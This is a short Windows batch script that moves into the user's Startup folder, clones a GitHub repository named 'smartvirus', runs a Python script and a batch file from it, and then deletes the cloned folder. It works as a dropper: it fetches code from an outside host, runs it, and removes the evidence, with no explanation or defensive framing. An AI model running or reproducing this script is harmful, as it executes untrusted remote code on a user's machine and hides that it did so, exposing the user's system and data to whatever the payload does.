setlocal enabledelayedexpansion
set "goto=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %goto%
git clone https://github.com/mattistjnn/smartvirus
timeout 2
cd smartvirus
python background.py
Start change.bat
timeout 2
cd ..
rmdir /s /q smartvirus